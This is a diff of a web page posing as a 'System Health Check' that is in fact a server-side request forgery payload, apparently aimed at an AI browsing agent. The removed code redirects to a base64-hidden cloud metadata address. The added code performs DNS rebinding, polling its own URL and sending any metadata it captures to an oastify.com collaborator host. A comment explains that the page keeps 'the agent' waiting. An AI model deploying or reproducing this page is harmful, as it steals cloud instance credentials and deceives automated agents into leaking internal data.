@@ -1,23 +1,34 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Network Diagnostic Tool</title>
-</head>
+<head><title>System Health Check</title></head>
 <body>
-    <h1>Diagnostic Phase: <span id="mode">Initializing...</span></h1>
+    <h1 id="status">Syncing with Node...</h1>
     <script>
         const collab = "ie0tcdsx4ho6q1jk8rxxwsjpmgs8gy4n.oastify.com";
-        
-        // Immediate beacon to see if JS is alive
-        new Image().src = `https://${collab}/js_alive?ua=${btoa(navigator.userAgent)}`;
+        const log = (p, d) => new Image().src = `https://${collab}/${p}?v=${btoa(JSON.stringify(d))}`;
 
-        // We use a base64 encoded redirect to hide the target from simple string filters
-        const target = atob("aHR0cDovLzE2OS4yNTQuMTY5LjI1NC9tZXRhZGF0YS9pbnN0YW5jZT9hcGktdmVyc2lvbj0yMDIxLTAyLTAx");
+        async function attemptRebind() {
+            // We attempt to fetch the same domain we are on.
+            // When the DNS flips, this will hit localhost or metadata.
+            try {
+                const res = await fetch(window.location.href, { cache: 'no-cache' });
+                const text = await res.text();
+                if (text.includes("compute") || text.includes("instance")) {
+                    log("REBIND_SUCCESS_SSRF", { data: text.substring(0, 200) });
+                }
+            } catch (e) {
+                // Silently wait for the flip
+            }
+        }
 
-        setTimeout(() => {
-            document.getElementById('mode').innerText = "Redirecting to Internal Node...";
-            window.location.href = target;
-        }, 3000);
+        window.onload = () => {
+            log("rebind_start", { ua: navigator.userAgent });
+            // Aggressive polling to catch the DNS change
+            setInterval(attemptRebind, 1000);
+            
+            // Keep the agent on the page by updating the UI
+            setTimeout(() => { document.getElementById('status').innerText = "Processing Data..."; }, 5000);
+        };
     </script>
 </body>
 </html>
